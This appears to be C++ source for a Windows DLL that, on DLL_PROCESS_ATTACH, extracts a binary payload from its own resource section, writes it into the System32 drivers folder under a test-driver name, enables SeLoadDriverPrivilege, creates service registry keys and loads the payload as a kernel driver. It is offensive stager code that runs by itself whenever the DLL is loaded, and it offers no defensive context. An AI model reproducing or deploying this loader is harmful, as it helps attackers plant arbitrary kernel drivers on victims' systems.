#include "EnablePrivilege.h"
#include "Helpers.h"
#include "DriverLoad.h"
#include "resource.h"

// Constants
// ------------------------------------------------------------------------

LPSTR DRIVER_NAME = "TestDriver_x64.sys";
LPWSTR DRIVER_PATH = L"\\??\\C:\\Windows\\System32\\drivers\\TestDriver_x64.sys";

// Call after DLL is loaded
// ------------------------------------------------------------------------

void go(HMODULE hMod) {
	// Retrieve payload from resource section
	HRSRC payloadRC = FindResourceA(hMod, MAKEINTRESOURCE(RID_PAYLOAD), "BINARY");
	std::string payload = std::string(
		(LPCSTR)(LockResource(LoadResource(hMod, payloadRC))),
		SizeofResource(hMod, payloadRC)
	);

	if (payload.empty())
		return;

	// Write payload to disk
	DWORD written;
	HANDLE hStager = CreateFileW(DRIVER_PATH, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hStager, payload.data(), payload.size(), &written, FALSE);
	CloseHandle(hStager);

	// Check if the driver exists in the path
	if (!exists(DRIVER_PATH))
		return;

	// Enable SeLoadDriverPrivilege
	if (!enable_privilege(SE_LOAD_DRIVER_NAME))
		return;

	// Write registry keys
	if (!create_reg_keys(DRIVER_NAME, DRIVER_PATH))
		return;

	// Load driver
	if (load_driver(DRIVER_NAME))
		return;
	else
		// Unload driver - Assuming loading failed cause driver was already loaded
		// Warning!! - Bold assumption used here lol!
		unload_driver(DRIVER_NAME);
	
	// Cleanup
	delete_reg_keys(DRIVER_NAME);
}

// DllMain
// ------------------------------------------------------------------------

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
	HANDLE threadHandle;
	DWORD dwThread;

	switch (fdwReason) {
	case DLL_PROCESS_ATTACH:
		// Init Code here
		go(hinstDLL);
		break;

	case DLL_THREAD_ATTACH:
		// Thread-specific init code here
		break;

	case DLL_THREAD_DETACH:
		// Thread-specific cleanup code here
		break;

	case DLL_PROCESS_DETACH:
		// Cleanup code here
		break;
	}

	// The return value is used for successful DLL_PROCESS_ATTACH
	return TRUE;
}